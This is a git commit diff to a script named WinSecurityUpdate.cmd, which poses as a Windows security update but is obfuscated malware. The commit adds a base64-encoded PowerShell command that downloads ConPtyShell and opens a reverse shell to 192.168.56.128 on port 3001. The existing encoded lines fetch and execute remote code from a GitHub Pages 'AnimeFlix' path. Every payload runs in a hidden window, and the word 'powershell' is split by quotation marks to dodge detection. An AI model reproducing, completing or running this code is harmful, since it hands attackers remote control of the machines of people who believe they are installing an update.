e1722d442435abe5c541ba06f073dd6061a9e5eb
Red Zodiac <95017544+Apoloyon@users.noreply.github.com>
2023-06-08 00:44:45 +0530

    Update WinSecurityUpdate.cmd

--- WinSecurityUpdate.cmd
+++ WinSecurityUpdate.cmd
@@ -4,6 +4,7 @@
 $a1 = "SW5WT2tFLUVYcHJlU1NJb04gKE5ldy1PQmpFQ3QgTmVULldFYkNMaWVuVCkuRG93TmxPYURTVHJpbkcoJ2h0dHBzOi8vYXBvbG95b24uZ2l0aHViLmlvL0FuaW1lRmxpeC9hMScp"
 $r1 = "SW5WT2tFLUVYcHJlU1NJb04gKE5ldy1PQmpFQ3QgTmVULldFYkNMaWVuVCkuRG93TmxPYURTVHJpbkcoJ2h0dHBzOi8vYXBvbG95b24uZ2l0aHViLmlvL0FuaW1lRmxpeC9yMScp"
 $d1 = "SW5WT2tFLUVYcHJlU1NJb04gKE5ldy1PQmpFQ3QgTmVULldFYkNMaWVuVCkuRG93TmxPYURTVHJpbkcoJ2h0dHBzOi8vYXBvbG95b24uZ2l0aHViLmlvL0FuaW1lRmxpeC9kMScp"
+$t1 = "SUVYKElXUiBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vYW50b25pb0NvY28vQ29uUHR5U2hlbGwvbWFzdGVyL0ludm9rZS1Db25QdHlTaGVsbC5wczEgLVVzZUJhc2ljUGFyc2luZyk7IEludm9rZS1Db25QdHlTaGVsbCAxOTIuMTY4LjU2LjEyOCAzMDAxCg=="
 start-sleep -s 1
 
 
@@ -19,6 +20,7 @@ $update_p2 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64
 $update_a1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($a1))
 $update_r1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($r1))
 $update_d1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($d1))
+$update_t1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($t1))
 
 
 echo $update_a1 | pow""ersh""ell -nop -windowstyle hidden - ; echo $update_r1 | pow""e""rsh""ell -nop -windowstyle hidden - ; echo $update_d1 | pow""e""rsh""ell -nop -windowstyle hidden - ; echo $update_t1 | pow""e""rsh""ell -nop -windowstyle hidden -  
